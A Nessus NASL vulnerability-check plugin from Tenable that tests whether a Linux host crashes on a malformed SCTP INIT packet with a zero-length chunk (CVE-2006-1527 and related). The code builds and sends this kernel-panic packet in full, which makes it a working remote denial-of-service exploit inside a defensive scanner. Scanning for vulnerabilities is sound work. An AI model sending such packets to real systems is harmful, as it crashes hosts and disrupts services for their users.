#
# (C) Tenable Network Security
#

if ( NASL_LEVEL < 2204 ) exit(0);


include("compat.inc");

if (description) {
  script_id(21333);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2006-1527", "CVE-2006-2934", "CVE-2006-3085");
  script_bugtraq_id(17806, 18550, 18755);
  if (defined_func("script_xref")) 
  {
    script_xref(name:"OSVDB", value:"25229");
    script_xref(name:"OSVDB", value:"26680");
    script_xref(name:"OSVDB", value:"26963");
  }

  script_name(english:"Linux SCTP Functionality Multiple Remote DoS");
  script_summary(english:"Sends an SCTP packet with a chunk header of length 0");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to crash the remote host by sending it a malformed SCTP
packet." );
 script_set_attribute(attribute:"description", value:
"There is a flaw in the Linux kernel on the remote host that causes a
kernel panic when it receives an SCTP packet with a chunk data packet
of length 0.  An attacker can leverage this flaw to crash the remote
host. Additionally, other types of crafted packets can cause a remote
denial of service in various SCTP related functions.

Note that successful exploitation of this issue requires that the
kernel support SCTP protocol connection tracking." );
 script_set_attribute(attribute:"see_also", value:"http://lists.netfilter.org/pipermail/netfilter-devel/2006-May/024241.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.kernel.org/pub/linux/kernel/v2.6/ChangeLog-2.6.16.13" );
 script_set_attribute(attribute:"see_also", value:"http://www.kernel.org/pub/linux/kernel/v2.6/ChangeLog-2.6.17.1" );
 script_set_attribute(attribute:"see_also", value:"http://www.kernel.org/pub/linux/kernel/v2.6/ChangeLog-2.6.16.23" );
 script_set_attribute(attribute:"see_also", value:"http://www.kernel.org/pub/linux/kernel/v2.6/ChangeLog-2.6.17.3" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Linux kernel 2.6.16.23 / 2.6.17.3 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C" );
script_end_attributes();

 
  script_category(ACT_KILL_HOST);
  script_family(english:"Denial of Service");
  script_require_keys("Settings/ParanoidReport");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  exit(0);
}

include("global_settings.inc");
include("raw.inc");

os = get_kb_item("Host/OS");
if ( os && "Linux" >!< os ) exit(0);

if (  report_paranoia < 2 ) exit(0);




if (islocalhost()) exit(0);
if (!get_host_open_port()) exit(0);
if ( TARGET_IS_IPV6 ) exit(0);


# Construct a malicious SCTP packet.
sctp = 
  # SCTP header
  mkword(rand()) +                     # source port
  mkword(rand()) +                     # destination port
  mkdword(0) +                         # verification tag
  mkdword(0) +                         # checksum (to be added later)

  # SCTP chunk 1
  mkbyte(1) +                          # type (1 => INIT)
  mkbyte(0) +                          # flags
  mkbyte(0);                           # length (0 => boom!)
chksum = inet_sum(sctp);
ip = ip(ip_p:132);                     # SCTP
sctp = payload(insstr(sctp, mkdword(chksum), 8, 11));
boom = mkpacket(ip, sctp);


# Send packet and check whether the host is down.
start_denial();
send_packet(boom, pcap_active:FALSE);
alive = end_denial();
if (!alive)
{
  set_kb_item(name:"Host/dead", value:TRUE);
  security_hole(0);
}
